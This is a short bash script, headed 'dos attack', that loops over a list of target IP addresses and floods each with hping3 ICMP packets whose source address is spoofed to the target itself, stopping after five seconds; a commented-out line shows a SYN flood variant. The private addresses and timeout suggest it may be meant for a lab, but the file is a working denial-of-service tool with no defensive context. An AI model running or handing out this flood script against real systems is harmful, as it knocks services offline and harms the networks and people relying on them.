# dos attack

# put a list of "IP" to be attacked
TARGETS=("192.168.100.100"\
	"#172.20.100.102"
	)

# 
for h in ${TARGETS[@]}; do
	# if first line starts with # skip that host
	if [[ "$h" =~ ^#.* ]]; then
		continue
	fi
	# we setup a background process to kill hping else will run forever
	#$(sleep 5; killall hping3)& hping3 -d 120 -S -w 64 -p 10 --flood $h
	$(sleep 5; killall hping3)& hping3 --icmp --flood $h -a $h
done

